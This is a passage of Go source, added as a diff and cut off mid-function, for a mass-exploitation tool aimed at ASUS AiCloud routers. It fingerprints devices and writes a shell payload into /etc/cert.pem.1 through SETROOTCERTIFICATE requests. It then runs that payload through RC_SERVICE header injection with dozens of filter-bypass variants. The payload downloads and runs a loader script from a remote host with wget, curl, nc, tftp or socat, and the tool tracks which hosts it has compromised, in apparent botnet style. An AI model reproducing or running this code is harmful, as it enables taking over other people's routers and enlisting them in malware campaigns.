@@ -1,0 +1,834 @@
+// ASUS AiCloud RCE: SETROOTCERTIFICATE (write /etc/cert.pem.1) + APPLYAPP (RC_SERVICE execution).
+// Loader: kla.sh from env ASUS_LOADER, ASUS_LOADER_PORT, ASUS_TAG.
+// Refs: CVE-2025-2492, CVE-2024-12912, CVE-2025-59366; runZero; routersploit; ASUS advisory.
+package main
+
+import (
+	"bufio"
+	"crypto/tls"
+	"errors"
+	"flag"
+	"fmt"
+	"io"
+	"net"
+	"os"
+	"os/signal"
+	"runtime"
+	"strings"
+	"sync"
+	"syscall"
+	"time"
+)
+
+var (
+	Port      = "null"
+	Separator = ","
+	Tls       = false
+	Debug     = false
+	MultiPort = false
+
+	SkipExploited   = true
+	ExploitedFile   = "exploited.txt"
+
+	WaitGroup sync.WaitGroup
+
+	Processed int
+	Found     int
+	Exploited int
+	Skipped   int
+
+	mu sync.Mutex
+
+	exploitedIPs  sync.Map // host -> true; loaded from file, updated on exploit
+	processingIPs sync.Map // host -> true; in-flight claim to prevent parallel exploit of same host
+	exploitedMu   sync.Mutex
+
+	config = &tls.Config{
+		MinVersion:         tls.VersionTLS10,
+		InsecureSkipVerify: true,
+	}
+
+	dialer = &net.Dialer{Timeout: 20 * time.Second}
+
+	// Common ASUS AiCloud ports (HTTP/HTTPS/alt)
+	commonPorts = []string{"80", "443", "8080", "8443", "8888", "8889", "8444", "8081", "8082", "9090", "9443", "8445", "8180", "8280", "8000", "8001", "8446", "8447", "8083", "444", "8448", "8084", "8085", "9000", "9080", "8880", "8008", "8043", "23"}
+
+	// Loader: kla.sh (same as tbk, faith, geoserver) - host, path, TCP port, tag for campaign
+	loaderHost    = "11.11.11.11"
+	loaderKlaPath = "/bins/kla.sh"
+	loaderPort    = "3342"
+	loaderTag     = "asus"
+
+	// Payloads written to /etc/cert.pem.1: multiple variants for different firmwares/shells (like tbk)
+	cmdPayloads []string
+
+	// Command to execute the saved script from /etc/cert.pem.1 - multiple injection methods for bypassing filters
+	cmd1Variants = []string{
+		"`sh /etc/cert.pem.1`",            // Original
+		"$(sh /etc/cert.pem.1)",           // Command substitution
+		"; sh /etc/cert.pem.1;",           // Chaining
+		"|| sh /etc/cert.pem.1 ||",        // OR chain
+		"&& sh /etc/cert.pem.1 &&",        // AND chain
+		"sh</etc/cert.pem.1",              // Input redirection
+		". /etc/cert.pem.1",               // Source
+		"bash /etc/cert.pem.1",            // Explicit bash
+		"/bin/sh /etc/cert.pem.1",         // Full path
+		"eval `cat /etc/cert.pem.1`",      // eval + cat (filter bypass)
+		"sh -c 'sh /etc/cert.pem.1'",      // sh -c
+		"sh /etc/cert.pem.1; true",        // with trailing true
+		"| sh /etc/cert.pem.1",            // pipe (some parsers)
+		"sh /etc/cert.pem.1 &",            // background only
+		"`cat /etc/cert.pem.1`|sh",        // cat pipe to sh
+		"sh /etc/cert.pem.1\n",            // newline terminator
+		"\nsh /etc/cert.pem.1",            // newline prefix (filter bypass)
+		"\n/bin/sh /etc/cert.pem.1\n",     // newline wrap
+		"$(cat /etc/cert.pem.1)|sh",       // cat pipe
+		"x;sh /etc/cert.pem.1",            // semicolon prefix
+		"sh /etc/cert.pem.1 #",            // comment suffix
+		"true && sh /etc/cert.pem.1",      // and chain
+		" :; sh /etc/cert.pem.1",          // colon no-op
+		"sh${IFS}/etc/cert.pem.1",         // IFS bypass (ASUS filter bypass research)
+		"/bin/sh${IFS}/etc/cert.pem.1",    // IFS full path
+		"sh\t/etc/cert.pem.1",             // tab separator
+		"sh /etc/cert.pem.1\n",            // newline at end
+		"sleep 0;sh /etc/cert.pem.1",      // sleep no-op
+		"sh /etc/cert.pem.1||true",        // or true
+		"command sh /etc/cert.pem.1",      // command prefix
+		"enable;sh /etc/cert.pem.1",       // enable prefix (some firmwares)
+	}
+)
+
+func init() {
+	if h := os.Getenv("ASUS_LOADER"); h != "" {
+		h = strings.TrimSpace(h)
+		if idx := strings.Index(h, ":"); idx >= 0 {
+			loaderHost = strings.TrimSpace(h[:idx])
+		} else {
+			loaderHost = h
+		}
+	}
+	if p := os.Getenv("ASUS_LOADER_PORT"); p != "" {
+		loaderPort = strings.TrimSpace(p)
+	}
+	if t := os.Getenv("ASUS_PAYLOAD_ARG"); t != "" {
+		loaderTag = strings.TrimSpace(t)
+	}
+	if t := os.Getenv("ASUS_TAG"); t != "" {
+		loaderTag = strings.TrimSpace(t)
+	}
+	urlKla := "http://" + loaderHost + loaderKlaPath
+	h, port, tag := loaderHost, loaderPort, loaderTag
+
+	// Several payload variants (like tbk/geoserver) - different firmwares/shells prefer different styles
+	cmdPayloads = []string{
+		// 1) Full: /dev/shm, /var/tmp, /tmp; wget/curl/nc; [ -s ] or [ -f ]; nohup/su
+		"cd /dev/shm 2>/dev/null || cd /var/tmp 2>/dev/null || cd /tmp\nrm -f kla.sh\n(wget -qO kla.sh " + urlKla + " 2>/dev/null || wget -O kla.sh " + urlKla + " 2>/dev/null || busybox wget -qO kla.sh " + urlKla + " 2>/dev/null || busybox wget -O kla.sh " + urlKla + " 2>/dev/null || curl -sLo kla.sh " + urlKla + " 2>/dev/null || nc " + h + " " + port + " > kla.sh 2>/dev/null || toybox nc " + h + " " + port + " > kla.sh 2>/dev/null)\n[ -s kla.sh ] && (chmod 777 kla.sh 2>/dev/null || chmod +x kla.sh) && (su -c 'nohup sh kla.sh " + tag + " >/dev/null 2>&1 &' 2>/dev/null || nohup sh kla.sh " + tag + " >/dev/null 2>&1 &)\n[ -f kla.sh ] && (chmod 777 kla.sh 2>/dev/null || chmod +x kla.sh) && (sh kla.sh " + tag + " &)\n",
+		// 2) One-line short (some devices choke on newlines)
+		"cd /tmp 2>/dev/null||cd /var/tmp||cd /tmp;rm -f kla.sh;(wget -O kla.sh " + urlKla + " 2>/dev/null||wget -qO kla.sh " + urlKla + " 2>/dev/null||busybox wget -O kla.sh " + urlKla + " 2>/dev/null||curl -sLo kla.sh " + urlKla + " 2>/dev/null||nc " + h + " " + port + " >kla.sh 2>/dev/null);[ -s kla.sh ]&&(chmod 777 kla.sh 2>/dev/null||chmod +x kla.sh)&&(nohup sh kla.sh " + tag + " >/dev/null 2>&1 &)\n",
+		// 3) Minimal: wget only, chmod 777, sh & (no nohup for minimal sh)
+		"cd /tmp;rm -f kla.sh;wget -O kla.sh " + urlKla + ";chmod 777 kla.sh;sh kla.sh " + tag + " &\n",
+		// 4) Busybox-first (wget is often busybox on routers)
+		"cd /tmp;rm -f kla.sh;busybox wget -O kla.sh " + urlKla + ";chmod 777 kla.sh;sh kla.sh " + tag + " &\n",
+		// 5) /dev/shm first (tmp noexec/full)
+		"cd /dev/shm 2>/dev/null||cd /tmp;rm -f kla.sh;wget -O kla.sh " + urlKla + ";chmod 777 kla.sh;sh kla.sh " + tag + " &\n",
+		// 6) wget URL first (some embedded wget expect URL then -O)
+		"cd /tmp;rm -f kla.sh;wget " + urlKla + " -O kla.sh;chmod 777 kla.sh;sh kla.sh " + tag + " &\n",
+		// 7) pipe to sh (no temp file; minimal env / read-only /tmp)
+		"wget -qO- " + urlKla + " 2>/dev/null|sh -s " + tag + " &\n",
+		// 8) curl pipe (if wget filtered)
+		"curl -sL " + urlKla + " 2>/dev/null|sh -s " + tag + " &\n",
+		// 9) busybox pipe
+		"busybox wget -qO- " + urlKla + " 2>/dev/null|sh -s " + tag + " &\n",
+		// 10) nc only (minimal, no wget/curl)
+		"cd /tmp;rm -f k;nc " + h + " " + port + " >k 2>/dev/null;[ -s k ]&&chmod +x k&&sh k " + tag + " &\n",
+		// 11) toybox nc
+		"cd /tmp;rm -f k;toybox nc " + h + " " + port + " >k 2>/dev/null;[ -s k ]&&chmod +x k&&sh k " + tag + " &\n",
+		// 12) tftp (some ASUS have tftp - port 69)
+		"cd /tmp;rm -f kla.sh;tftp -g -r kla.sh " + h + " 69 2>/dev/null;[ -s kla.sh ]&&chmod +x kla.sh&&sh kla.sh " + tag + " &\n",
+		// 13) wget -N (no clobber style)
+		"cd /tmp;rm -f kla.sh;wget -q -O kla.sh " + urlKla + " 2>/dev/null;chmod 700 kla.sh;sh kla.sh " + tag + " &\n",
+		// 14) curl -k (ignore SSL if URL was https)
+		"cd /tmp;rm -f kla.sh;curl -skLo kla.sh " + urlKla + " 2>/dev/null;chmod +x kla.sh;sh kla.sh " + tag + " &\n",
+		// 15) /var/tmp only (like tbk)
+		"cd /var/tmp 2>/dev/null||cd /tmp;rm -f kla.sh;wget -O kla.sh " + urlKla + " 2>/dev/null;chmod 777 kla.sh;sh kla.sh " + tag + " &\n",
+		// 16) chmod 777 * (Mirai-style, tbk buildPayloadShortChmodStar)
+		"cd /tmp;rm -f kla.sh;wget -O kla.sh " + urlKla + " 2>/dev/null;chmod 777 *;sh kla.sh " + tag + " &\n",
+		// 17) short filename k (faith/tbk style)
+		"cd /tmp;rm -f k;wget -O k " + urlKla + " 2>/dev/null;chmod 777 k;sh k " + tag + " &\n",
+		// 18) wget -T 5 (timeout 5s for slow networks)
+		"cd /tmp;rm -f kla.sh;wget -T 5 -qO kla.sh " + urlKla + " 2>/dev/null;chmod +x kla.sh;sh kla.sh " + tag + " &\n",
+		// 19) curl --connect-timeout 5
+		"cd /tmp;rm -f kla.sh;curl -s --connect-timeout 5 -Lo kla.sh " + urlKla + " 2>/dev/null;chmod +x kla.sh;sh kla.sh " + tag + " &\n",
+		// 20) socat if present (some routers have it)
+		"cd /tmp;rm -f k;socat - tcp:" + h + ":" + port + " >k 2>/dev/null;[ -s k ]&&chmod +x k&&sh k " + tag + " &\n",
+	}
+}
+
+func loadExploited() {
+	f, err := os.Open(ExploitedFile)
+	if err != nil {
+		if !os.IsNotExist(err) {
+			fmt.Fprintf(os.Stderr, "[warn] Cannot open exploited file %s: %v\n", ExploitedFile, err)
+		}
+		return
+	}
+	defer f.Close()
+	count := 0
+	sc := bufio.NewScanner(f)
+	for sc.Scan() {
+		ip := strings.TrimSpace(sc.Text())
+		if ip == "" || strings.HasPrefix(ip, "#") {
+			continue
+		}
+		exploitedIPs.Store(ip, true)
+		count++
+	}
+	fmt.Fprintf(os.Stderr, "[*] Loaded %d exploited IPs from %s (will skip them)\n", count, ExploitedFile)
+}
+
+func markExploited(host string) {
+	if _, loaded := exploitedIPs.LoadOrStore(host, true); loaded {
+		return
+	}
+	exploitedMu.Lock()
+	defer exploitedMu.Unlock()
+	f, err := os.OpenFile(ExploitedFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[warn] Cannot write exploited file: %v\n", err)
+		return
+	}
+	defer f.Close()
+	fmt.Fprintln(f, host)
+}
+
+func isExploited(host string) bool {
+	_, ok := exploitedIPs.Load(host)
+	return ok
+}
+
+func DialTimeout(target string) (net.Conn, error) {
+	// Auto-enable TLS for HTTPS-like ports
+	useTLS := Tls
+	if strings.Contains(target, ":443") || strings.Contains(target, ":8443") ||
+		strings.Contains(target, ":8444") || strings.Contains(target, ":9443") ||
+		strings.Contains(target, ":8445") || strings.Contains(target, ":8446") ||
+		strings.Contains(target, ":8447") || strings.Contains(target, ":444") ||
+		strings.Contains(target, ":8448") || strings.Contains(target, ":8043") {
+		useTLS = true
+	}
+	
+	if useTLS {
+		return tls.DialWithDialer(dialer, "tcp", target, config)
+	} else {
+		return net.DialTimeout("tcp", target, 20*time.Second)
+	}
+}
+
+func verifyDevice(target string) error {
+	conn, err := DialTimeout(target)
+	if err != nil {
+		if Debug {
+			fmt.Fprintf(os.Stderr, "[DEBUG] %s: connection failed: %v\n", target, err)
+		}
+		return err
+	}
+	defer conn.Close()
+	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+
+	// Try GET request first (more universal)
+	var request = []byte("GET / HTTP/1.1\r\n" +
+		"Host: " + target + "\r\n" +
+		"User-Agent: Mozilla/5.0\r\n" +
+		"Connection: close\r\n\r\n")
+
+	_, err = conn.Write(request)
+	if err != nil {
+		if Debug {
+			fmt.Fprintf(os.Stderr, "[DEBUG] %s: write failed: %v\n", target, err)
+		}
+		return err
+	}
+
+	bytes, err := io.ReadAll(conn)
+	if err != nil && err != io.EOF {
+		if Debug {
+			fmt.Fprintf(os.Stderr, "[DEBUG] %s: read failed: %v\n", target, err)
+		}
+		return err
+	}
+
+	response := string(bytes)
+	responseLower := strings.ToLower(response)
+
+	// ASUS AiCloud / AsusWRT indicators (CVE-2025-2492, CVE-2024-12912; runZero: Asus AsusWRT 382/386/388/102)
+	hasAiCloud := strings.Contains(response, "AiCloud") ||
+		strings.Contains(responseLower, "aicloud") ||
+		strings.Contains(response, "/smb/css/startup.png") ||
+		strings.Contains(responseLower, "asus") ||
+		strings.Contains(responseLower, "asuswrt")
+	has401 := strings.Contains(response, "401") || strings.Contains(responseLower, "unauthorized")
+	// Many ASUS routers run lighttpd; 401 on root often means auth-required (AiCloud)
+	hasLighttpd := strings.Contains(responseLower, "lighttpd")
+	hasAsusWRT := strings.Contains(responseLower, "asuswrt")
+
+	if Debug && len(response) > 0 {
+		fmt.Fprintf(os.Stderr, "[DEBUG] %s: response length=%d, hasAiCloud=%v, has401=%v, lighttpd=%v\n",
+			target, len(response), hasAiCloud, has401, hasLighttpd)
+		if len(response) < 500 {
+			fmt.Fprintf(os.Stderr, "[DEBUG] %s: response preview: %s\n", target, response[:min(len(response), 200)])
+		}
+	}
+
+	// Accept: ASUS indicators + 401, or AsusWRT + 401, or lighttpd + 401 (common on ASUS)
+	if (hasAiCloud && has401) || (hasAiCloud && strings.Contains(response, "startup.png")) {
+		return nil
+	}
+	if (hasAsusWRT && has401) || (hasLighttpd && has401) {
+		return nil
+	}
+
+	// If GET didn't work, try PROPFIND
+	conn2, err := DialTimeout(target)
+	if err != nil {
+		return errors.New("not ASUS AiCloud")
+	}
+	defer conn2.Close()
+	conn2.SetReadDeadline(time.Now().Add(10 * time.Second))
+
+	propfind := []byte("PROPFIND / HTTP/1.1\r\n" +
+		"Host: " + target + "\r\n" +
+		"User-Agent: -\r\n" +
+		"Connection: close\r\n" +
+		"Referer: http://" + target + "/\r\n\r\n")
+
+	_, _ = conn2.Write(propfind)
+	bytes2, _ := io.ReadAll(conn2)
+	response2 := string(bytes2)
+	response2Lower := strings.ToLower(response2)
+
+	if strings.Contains(response2, "AiCloud") ||
+		strings.Contains(response2Lower, "aicloud") ||
+		strings.Contains(response2, "/smb/css/startup.png") ||
+		(strings.Contains(response2, "401") && (strings.Contains(response2Lower, "asus") || strings.Contains(response2Lower, "asuswrt"))) {
+		return nil
+	}
+
+	return errors.New("not ASUS AiCloud")
+}
+
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
+
+// xmlEscape escapes payload for XML so <, >, & do not break parser on device
+func xmlEscape(s string) string {
+	s = strings.ReplaceAll(s, "&", "&amp;")
+	s = strings.ReplaceAll(s, "<", "&lt;")
+	s = strings.ReplaceAll(s, ">", "&gt;")
+	s = strings.ReplaceAll(s, "\"", "&quot;")
+	return s
+}
+
+// buildCertBody builds cert body: shell shebang + payload. useCDATA wraps in CDATA so raw <>& allowed
+func buildCertBody(payload string, useCDATA bool) string {
+	const prefix = "#!/bin/sh\n#-----BEGIN CERTIFICATE-----\n\n"
+	const suffix = "\n"
+	if useCDATA {
+		// CDATA allows raw <, >, & in payload (device must accept CDATA)
+		return prefix + "<![CDATA[" + payload + "]]>" + suffix
+	}
+	return prefix + xmlEscape(payload) + suffix
+}
+
+// Multiple SETROOTCERTIFICATE injection methods - different XML formats and payload escaping
+var setRootMethods = []func(string, string) string{
+	// Method 1: Standard format, CDATA (payload can contain < > &)
+	func(target, payload string) string {
+		body := buildCertBody(payload, true)
+		data := `<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+	// Method 2: Standard format, escaped payload (for parsers that don't like CDATA)
+	func(target, payload string) string {
+		body := buildCertBody(payload, false)
+		data := `<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+	// Method 3: Alternative XML, CDATA
+	func(target, payload string) string {
+		body := buildCertBody(payload, true)
+		data := `<?xml version="1.0"?><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+	// Method 4: Without standalone, escaped
+	func(target, payload string) string {
+		body := buildCertBody(payload, false)
+		data := `<?xml version="1.0" encoding="UTF-8"><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+	// Method 5: Path / , CDATA
+	func(target, payload string) string {
+		body := buildCertBody(payload, true)
+		data := `<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE / HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+	// Method 6: With User-Agent, CDATA
+	func(target, payload string) string {
+		body := buildCertBody(payload, true)
+		data := `<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+	// Method 7: Content-Type application/xml (some daemons require it; security research / CVE)
+	func(target, payload string) string {
+		body := buildCertBody(payload, true)
+		data := `<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nContent-Type: application/xml\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+	// Method 8: Path /smb/css/ (AiCloud WebDAV path seen in XXE/routersploit)
+	func(target, payload string) string {
+		body := buildCertBody(payload, true)
+		data := `<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE /smb/css/ HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+	// Method 9: Path /. (root with dot)
+	func(target, payload string) string {
+		body := buildCertBody(payload, true)
+		data := `<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE /. HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+	// Method 10: Path /smb/ (AiCloud)
+	func(target, payload string) string {
+		body := buildCertBody(payload, true)
+		data := `<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE /smb/ HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+	// Method 11: Path /index.html
+	func(target, payload string) string {
+		body := buildCertBody(payload, true)
+		data := `<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE /index.html HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+	// Method 12: Accept: */* + application/xml
+	func(target, payload string) string {
+		body := buildCertBody(payload, true)
+		data := `<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nAccept: */*\r\nContent-Type: application/xml\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+	// Method 13: Path /smb/css/setting.html (XXE-style path)
+	func(target, payload string) string {
+		body := buildCertBody(payload, true)
+		data := `<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE /smb/css/setting.html HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+	// Method 14: text/xml Content-Type
+	func(target, payload string) string {
+		body := buildCertBody(payload, true)
+		data := `<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+	// Method 15: Path / (no trailing slash)
+	func(target, payload string) string {
+		body := buildCertBody(payload, true)
+		data := `<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><content><key>-----BEGIN RSA PRIVATE KEY-----id</key><cert>` + body + `</cert><intermediate_crt>-----BEGIN CERTIFICATE-----</intermediate_crt></content>`
+		return fmt.Sprintf("SETROOTCERTIFICATE / HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", target, len(data), data)
+	},
+}
+
+// Multiple APPLYAPP injection methods - different header formats
+var applyAppMethods = []func(string, string) string{
+	// Method 1: Standard format (most common)
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nACTION_MODE: apply\r\nSET_NVRAM: aa\r\nRC_SERVICE: %s\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 2: Without ACTION_MODE
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nSET_NVRAM: aa\r\nRC_SERVICE: %s\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 3: Different path
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP / HTTP/1.1\r\nHost: %s\r\nACTION_MODE: apply\r\nSET_NVRAM: aa\r\nRC_SERVICE: %s\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 4: With User-Agent
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nACTION_MODE: apply\r\nSET_NVRAM: aa\r\nRC_SERVICE: %s\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 5: Alternative header order
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nRC_SERVICE: %s\r\nACTION_MODE: apply\r\nSET_NVRAM: aa\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 6: With Referer
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nReferer: http://%s/\r\nACTION_MODE: apply\r\nSET_NVRAM: aa\r\nRC_SERVICE: %s\r\nConnection: close\r\n\r\n", target, target, cmd)
+	},
+	// Method 7: Content-Length: 0 (explicit body length for strict parsers)
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nContent-Length: 0\r\nACTION_MODE: apply\r\nSET_NVRAM: aa\r\nRC_SERVICE: %s\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 8: Path /smb/css/ (AiCloud path)
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /smb/css/ HTTP/1.1\r\nHost: %s\r\nACTION_MODE: apply\r\nSET_NVRAM: aa\r\nRC_SERVICE: %s\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 9: Content-Type + Content-Length 0
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\nRC_SERVICE: %s\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 10: lowercase rc-service (some parsers)
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nrc-service: %s\r\nACTION_MODE: apply\r\nSET_NVRAM: aa\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 11: Rc-Service (mixed case)
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nRc-Service: %s\r\nACTION_MODE: apply\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 12: no SET_NVRAM (minimal headers)
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP / HTTP/1.1\r\nHost: %s\r\nRC_SERVICE: %s\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 13: Accept */*
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nAccept: */*\r\nRC_SERVICE: %s\r\nACTION_MODE: apply\r\nSET_NVRAM: aa\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 14: path /smb/
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /smb/ HTTP/1.1\r\nHost: %s\r\nRC_SERVICE: %s\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 15: path /smb/css/setting.html
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /smb/css/setting.html HTTP/1.1\r\nHost: %s\r\nRC_SERVICE: %s\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 16: X-RC-SERVICE (alternative header name)
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /favicon.ico/ HTTP/1.1\r\nHost: %s\r\nX-RC-SERVICE: %s\r\nACTION_MODE: apply\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 17: Content-Length 0 + rc-service lowercase
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP / HTTP/1.1\r\nHost: %s\r\nContent-Length: 0\r\nrc-service: %s\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+	// Method 18: Path /.
+	func(target, cmd string) string {
+		return fmt.Sprintf("APPLYAPP /. HTTP/1.1\r\nHost: %s\r\nRC_SERVICE: %s\r\nConnection: close\r\n\r\n", target, cmd)
+	},
+}
+
+const (
+	readRespTimeout  = 25 * time.Second
+	stepDelay        = 3 * time.Second  // delay between SETROOTCERTIFICATE and APPLYAPP for slow routers
+	retryDelay       = 400 * time.Millisecond // delay between combo retries so device is not overwhelmed
+)
+
+// isHTTPOk checks if response starts with HTTP/1.x 2xx
+func isHTTPOk(response string) bool {
+	if len(response) < 12 {
+		return false
+	}
+	// "HTTP/1.0 200" or "HTTP/1.1 201"
+	return strings.HasPrefix(response, "HTTP/1.") && (response[9] == '2' || (len(response) > 10 && response[10] == '2'))
+}
+
+func setRootCertificate(target string, methodIndex int, payload string) error {
+	conn, err := DialTimeout(target)
+	if err != nil {
+		return err
+	}
+	defer conn.Close()
+	conn.SetReadDeadline(time.Now().Add(readRespTimeout))
+
+	methodIdx := methodIndex % len(setRootMethods)
+	request := setRootMethods[methodIdx](target, payload)
+	n, err := conn.Write([]byte(request))
+	if err != nil {
+		return err
+	}
+	if n != len(request) {
+		return fmt.Errorf("short write: %d/%d", n, len(request))
+	}
+	// Drain response so server can finish writing to /etc/cert.pem.1
